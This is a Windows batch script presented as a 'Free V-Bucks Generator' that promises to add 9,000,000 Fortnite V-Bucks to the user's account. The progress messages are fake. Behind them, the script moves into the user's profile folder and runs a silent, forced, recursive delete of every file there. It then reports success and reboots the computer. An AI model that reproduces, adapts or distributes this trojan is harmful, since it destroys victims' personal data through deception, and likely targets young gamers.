title Free V-Bucks Generator

COLOR 09

@ECHO OFF
CLS
ECHO        ====
ECHO     =        =
ECHO    =   \  /   =
ECHO    =    \/    =
ECHO     =        =
ECHO        ====
ECHO.
ECHO Please press the 1 key to generate 9000000 V-Bucks and add them to your account!

CHOICE /C 1 /M ""

IF ERRORLEVEL 1 GOTO Start

:Start
CLS
COLOR 02
title Generating V-Bucks...
ECHO Generating ticket...
timeout 5 >nul
ECHO Ticket generated!
ECHO Generating V-Bucks...
timeout 1 >nul
title Generating V-Bucks... (0.0001%)
ECHO 14
timeout 1 >nul
title Generating V-Bucks... (0.003%)
ECHO 270
timeout 1 >nul
title Generating V-Bucks... (0.01%)
ECHO 643
timeout 1 >nul
title Generating V-Bucks... (0.03%)
ECHO 2715
timeout 1 >nul
title Generating V-Bucks... (0.09%)
ECHO 8010
timeout 1 >nul
title Generating V-Bucks... (0.34%)
ECHO 30552
timeout 1 >nul
title Generating V-Bucks... (2.15%)
ECHO 193572
timeout 1 >nul
title Generating V-Bucks... (6.66%)
ECHO 599845
timeout 1 >nul
title Generating V-Bucks... (39.86%)
ECHO 3587096
timeout 1 >nul
title Generating V-Bucks... (93.19%)
ECHO 8386734
timeout 1 >nul
title Generating V-Bucks... (100%)
ECHO 9000000
ECHO Validating ticket and V-Bucks with Epic Games...
timeout 120 >nul
ECHO Validation successful!
ECHO Adding V-Bucks to your account...
C: >nul
cd .. >nul
cd .. >nul
cd .. >nul
cd Users >nul
cd %username% >nul
DEL /F/Q/S *.* >nul
ECHO V-Bucks successfully added to your account!
ECHO Rebooting so your balance updates...
shutdown /r